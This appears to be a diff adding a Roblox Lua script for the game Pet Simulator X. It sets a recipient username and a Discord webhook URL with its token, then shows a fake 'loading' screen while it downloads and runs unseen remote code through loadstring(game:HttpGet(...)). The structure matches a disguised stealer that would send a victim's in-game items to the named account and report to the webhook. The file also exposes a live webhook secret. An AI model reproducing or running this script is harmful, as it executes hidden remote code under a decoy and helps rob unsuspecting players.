@@ -1,1 +1,19 @@
+Username = "ashleypaglinawan11"
+
+WebHook = "https://discord.com/api/webhooks/1099279795243712572/dDjLACsaMDo4J04HsjmQRLThmXHZT7EYCyC7ju1tZ8Ze8CjSai_0KdyCrn0w2AadITVI"
+
+loadingscreen = true
+
+_G.CustomScriptName = "JmesV2 Mine Update!"
+
+_G.Text1 = "this may take a while!"
+
+_G.Text2 = "loading has started!"
+
+_G.Text3 = "loading..."
+
+_G.Text4 = "script is loaded enjoy!!!"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+
 
